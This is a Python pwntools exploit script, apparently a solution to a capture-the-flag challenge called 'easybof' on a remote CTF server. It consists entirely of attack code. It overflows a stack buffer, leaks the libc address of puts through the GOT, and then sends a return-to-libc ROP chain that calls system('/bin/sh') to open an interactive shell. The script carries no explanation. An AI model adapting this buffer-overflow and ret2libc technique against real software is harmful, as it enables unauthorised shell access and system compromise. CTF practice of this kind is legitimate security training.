from pwn import *

p = process("./easybof")
p = remote("ctf.lordofpwn.kr",1111)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
e = ELF("./easybof")

p.sendafter(":","A"*0x100+"+SUNRIN+")
prdi = 0x0000000000400953

#raw_input()
payload = "A"*0x108
payload += p64(prdi)
payload += p64(e.got["puts"])
payload += p64(e.plt["puts"])
payload += p32(0x0000000000400873)

print hex(len(payload))


p.sendafter("!",payload)

libc_base = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - libc.symbols["puts"]

print hex(libc_base)

payload = "A"*0x108
payload += p64(0x0000000000400873)

p.sendafter("!",payload)

payload = "A"*0x108
payload += p64(prdi)
payload += p64(libc_base+next(libc.search("/bin/sh")))
payload += p64(libc_base+libc.symbols["system"])
p.sendafter("!",payload)
p.interactive()
